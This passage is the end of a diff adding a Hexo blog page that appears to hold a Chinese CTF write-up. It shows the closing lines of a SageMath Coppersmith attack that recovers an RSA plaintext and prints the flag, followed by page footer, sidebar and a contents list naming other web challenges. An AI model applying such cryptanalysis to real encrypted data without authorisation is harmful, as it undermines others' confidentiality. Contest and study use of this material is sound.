PolynomialRing(Zmod(n))</span><br><span class="line">f = ((M + x*r)^e) - c</span><br><span class="line">f = f.monic()</span><br><span class="line">x0 = f.small_roots(X=2^kbits,beta=1)[0]</span><br><span class="line">print(x0)</span><br><span class="line">m = M + x0*r</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+
+<p>运行得出flag。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf-web/" rel="tag"># -ctf -web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/03/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C2/" rel="next" title="攻防世界2">
+                <i class="fa fa-chevron-left"></i> 攻防世界2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%99%8E%E7%AC%A6%E8%B5%9B%E9%81%93"><span class="nav-number"></span> <span class="nav-text">虎符赛道</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Plain-Text"><span class="nav-number">1.</span> <span class="nav-text">Plain Text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Quest-Crash"><span class="nav-number">2.</span> <span class="nav-text">Quest-Crash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Quest-RCE"><span class="nav-number">3.</span> <span class="nav-text">Quest-RCE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#other"><span class="nav-number"></span> <span class="nav-text">other</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7%E8%B5%9B%E9%81%93"><span class="nav-number"></span> <span class="nav-text">红明谷赛道</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MissingFile"><span class="nav-number">1.</span> <span class="nav-text">MissingFile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fan-website"><span class="nav-number">2.</span> <span class="nav-text">Fan website</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Smarty-calculator"><span class="nav-number">3.</span> <span class="nav-text">Smarty_calculator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">3.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">3.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-ya"><span class="nav-number">4.</span> <span class="nav-text">easy_ya</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
